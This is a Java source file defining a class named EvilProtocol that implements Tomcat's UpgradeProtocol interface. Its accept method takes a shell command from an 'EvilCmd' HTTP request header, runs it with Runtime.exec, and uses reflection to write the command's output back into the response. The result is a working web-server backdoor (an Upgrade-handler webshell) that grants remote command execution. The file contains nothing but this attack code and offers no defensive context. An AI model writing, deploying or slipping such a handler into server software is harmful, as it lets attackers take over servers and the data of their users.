package com.vdt;

import org.apache.coyote.*;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;

import java.lang.reflect.Field;
import java.nio.ByteBuffer;

public class EvilProtocol implements UpgradeProtocol {

    @Override
    public String getHttpUpgradeName(boolean b) {
        return "";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return "";
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, Request request) {
        return null;
    }

    @Override
    public boolean accept(Request request) {
        // This method is called when there is an Upgrade header in the request
        // that specifies this protocol name.

        String cmd = request.getHeader("EvilCmd");
        if (cmd != null) {
            byte[] result = null;
            try {
                result = Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes();
                Field resonseField = Request.class.getDeclaredField("response");
                resonseField.setAccessible(true);
                Response response = (Response) resonseField.get(request);
                response.doWrite(ByteBuffer.wrap(result));
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        return false; // Reject all upgrades
    }
}
